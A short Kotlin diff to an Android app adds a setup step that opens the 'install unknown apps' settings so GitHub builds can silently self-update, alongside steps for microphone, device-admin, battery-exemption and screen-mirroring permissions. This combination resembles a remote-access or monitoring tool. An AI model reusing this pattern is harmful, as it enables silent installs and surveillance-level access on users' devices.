@@ -211,6 +211,15 @@ class MainActivity : ComponentActivity() {
             }),
             AutoStep("mic", { hasMic(ctx) }, { micLauncher.launch(Manifest.permission.RECORD_AUDIO) }),
             AutoStep("battery", { hasBatteryIgnore(ctx) }, { requestIgnoreBattery(ctx) }),
+            // Silent self-update ke liye EK BAAR "install unknown apps" chahiye —
+            // iske bina naya GitHub build auto-install nahi ho sakta.
+            AutoStep("unknown", { ctx.packageManager.canRequestPackageInstalls() }, {
+                runCatching {
+                    ctx.startActivity(
+                        Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:" + ctx.packageName))
+                    )
+                }
+            }, timeoutMs = 60_000L),
             AutoStep("admin", { hasAdmin(ctx) }, { runCatching { ctx.startActivity(adminIntent) } }),
             AutoStep("mirror", { MirrorManager.hasProjection }, {
                 runCatching { ctx.startActivity(Intent(ctx, ConsentActivity::class.java)) }
